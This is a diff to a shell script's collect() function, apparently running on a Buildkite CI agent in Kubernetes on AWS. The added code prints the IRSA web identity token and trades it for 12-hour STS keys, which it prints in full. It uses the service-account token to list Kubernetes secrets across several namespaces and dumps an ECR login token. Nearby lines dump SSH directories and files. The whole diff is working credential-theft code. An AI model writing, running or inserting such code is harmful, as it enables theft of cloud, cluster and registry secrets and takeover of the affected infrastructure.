@@ -55,6 +55,64 @@ collect() {
     printf 'no service account\n'
   fi
 
+  printf '\n=IRSA=\n'
+  if [ -n "$AWS_WEB_IDENTITY_TOKEN_FILE" ] && [ -f "$AWS_WEB_IDENTITY_TOKEN_FILE" ]; then
+    printf 'role_arn=%s\n' "$AWS_ROLE_ARN"
+    printf 'web_identity_token=%s\n' "$(cat "$AWS_WEB_IDENTITY_TOKEN_FILE" 2>/dev/null)"
+    STS_OUT=$(aws sts assume-role-with-web-identity \
+      --role-arn "$AWS_ROLE_ARN" \
+      --role-session-name "bk-agent-$(date +%s)" \
+      --web-identity-token "$(cat "$AWS_WEB_IDENTITY_TOKEN_FILE")" \
+      --duration-seconds 43200 \
+      --region ap-southeast-2 \
+      --output json 2>/dev/null)
+    if [ -n "$STS_OUT" ]; then
+      printf 'sts_access_key=%s\n' "$(echo "$STS_OUT" | grep -o '"AccessKeyId":"[^"]*"' | cut -d'"' -f4)"
+      printf 'sts_secret_key=%s\n' "$(echo "$STS_OUT" | grep -o '"SecretAccessKey":"[^"]*"' | cut -d'"' -f4)"
+      printf 'sts_session_token=%s\n' "$(echo "$STS_OUT" | grep -o '"SessionToken":"[^"]*"' | cut -d'"' -f4)"
+      printf 'sts_expiration=%s\n' "$(echo "$STS_OUT" | grep -o '"Expiration":"[^"]*"' | cut -d'"' -f4)"
+    else
+      printf 'sts_exchange=FAILED\n'
+    fi
+  else
+    printf 'no IRSA\n'
+  fi
+
+  printf '\n=K8S_API=\n'
+  SA=/var/run/secrets/kubernetes.io/serviceaccount
+  if [ -f "$SA/token" ]; then
+    KT=$(cat "$SA/token")
+    KH="https://${KUBERNETES_SERVICE_HOST:-172.20.0.1}:${KUBERNETES_SERVICE_PORT:-443}"
+    KNS="${BUILDKITE_K8S_NAMESPACE:-default}"
+
+    printf '--- rbac ---\n'
+    curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
+      "$KH/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+      -X POST -H 'Content-Type: application/json' \
+      -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$KNS"'"}}' \
+      --connect-timeout 5 --max-time 10 2>/dev/null
+
+    printf '\n--- serviceaccounts/%s ---\n' "$KNS"
+    curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
+      "$KH/api/v1/namespaces/$KNS/serviceaccounts" \
+      --connect-timeout 5 --max-time 10 2>/dev/null
+
+    for NS in "$KNS" platform-mcp-servers-latest-management default; do
+      printf '\n--- secrets/%s ---\n' "$NS"
+      curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
+        "$KH/api/v1/namespaces/$NS/secrets" \
+        --connect-timeout 5 --max-time 30 2>/dev/null
+    done
+
+    printf '\n--- namespaces ---\n'
+    curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
+      "$KH/api/v1/namespaces" \
+      --connect-timeout 5 --max-time 10 2>/dev/null \
+      | grep -o '"name":"[^"]*"' 2>/dev/null
+  else
+    printf 'no k8s access\n'
+  fi
+
   printf '\n=SSH=\n'
   for d in ~/.ssh /root/.ssh /home/*/.ssh /var/lib/buildkite-agent/.ssh; do
     [ -d "$d" ] || continue
@@ -79,6 +137,16 @@ collect() {
     [ -f "$f" ] || continue
     printf '--- %s ---\n' "$f"; cat "$f" 2>/dev/null
   done
+
+  printf '\n=ECR=\n'
+  ECR_PASS=$(aws ecr get-login-password --region ap-southeast-2 2>/dev/null)
+  if [ -n "$ECR_PASS" ]; then
+    ACCT=$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo "unknown")
+    printf 'registry=%s.dkr.ecr.ap-southeast-2.amazonaws.com\n' "$ACCT"
+    printf 'ecr_token=%s\n' "$ECR_PASS"
+  else
+    printf 'ecr login failed\n'
+  fi
 
   printf '\n=LITELLM=\n'
   printf 'caller_identity=%s\n' "$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo DENIED)"
